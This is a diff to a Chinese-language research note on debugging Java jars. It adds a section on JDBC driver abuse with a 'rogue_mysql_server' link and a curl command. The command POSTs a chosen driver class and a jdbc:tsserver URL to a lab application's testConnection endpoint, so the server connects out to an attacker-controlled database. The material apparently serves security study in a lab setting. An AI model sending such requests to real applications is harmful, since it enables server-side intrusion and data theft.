@@ -1,4 +1,5 @@
 - 有 pom.xml 文件，复制内容到 idea. maven 更新，会有些 vuln 提示
+- [jdbcDriver](#jdbcdriver) : rogue_mysql_server 
 
 # Java jar 文件调试
 
@@ -14,3 +15,10 @@ java -jar -Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5005 
 `Edit Configuration - remote`, 默认参数即可。
 
 - 下断点可正常调试了
+
+
+# jdbcDriver
+```sh
+curl 192.168.142.1:8080/app3/testConnection/ -d 'Driver=com.tinysoft.jdbc.bridge.client.ClientDriver&url=jdbc:tsserver://127.0.0.1:3306/test'
+# jdbc:tsserver 地址是是从服务器端发起的请求地址.
+```
